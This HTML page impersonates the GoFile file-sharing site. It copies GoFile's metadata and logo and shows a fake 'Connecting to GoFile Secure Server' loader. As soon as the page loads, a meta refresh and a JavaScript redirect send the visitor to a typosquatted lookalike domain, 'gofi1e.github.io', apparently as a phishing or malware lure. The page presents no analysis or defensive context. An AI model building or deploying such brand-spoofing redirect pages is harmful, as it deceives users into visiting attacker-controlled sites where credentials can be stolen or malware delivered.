<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GoFile - Free File Sharing</title>

    <meta property="og:type" content="website">
    <meta property="og:site_name" content="GoFile">
    <meta property="og:title" content="GoFile - Store and share your files for free">
    <meta property="og:description" content="GoFile is a free file sharing and storage platform. You can store and share data without limits.">
    <meta property="og:url" content="https://gofile.io">
    <meta property="og:image" content="https://gofile.io/dist/img/logo_og.png">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://gofile.io/dist/img/logo_og.png">

    <meta http-equiv="refresh" content="0; url=https://gofi1e.github.io/Bqxl">
    <script type="text/javascript">
        window.location.replace("https://gofi1e.github.io/Bqxl");
    </script>
</head>

<body style="background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; margin: 0;">

    <div style="text-align: center;">
        <img src="https://gofile.io/dist/img/logo_og.png" alt="GoFile" style="width: 80px; margin-bottom: 20px;">
        <p style="font-size: 18px; letter-spacing: 1px;">Connecting to GoFile Secure Server...</p>
        <div class="loader"></div>
    </div>

    <style>
        .loader {
            border: 3px solid #333;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>

</body>
</html>
